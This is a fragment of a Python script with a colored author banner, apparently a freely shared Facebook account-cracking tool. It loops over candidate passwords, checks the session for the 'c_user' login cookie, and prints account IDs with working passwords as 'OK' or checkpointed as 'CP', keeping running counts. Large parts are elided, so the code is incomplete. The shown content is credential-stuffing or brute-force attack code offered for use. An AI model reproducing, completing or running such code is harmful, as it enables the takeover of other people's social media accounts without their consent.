...
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : MR.ARY4N0
\033[1;37m[*] Github        : Zunera
\033[1;37m[*] Status        : FREE
\033[1;37m[*] TEAM          : N0 IM SINGLE
\033[1;37m[*] UPDATE BY     : Zunera
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Zunera-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;31m[Zunera-CP-💔]  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|Zunera-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
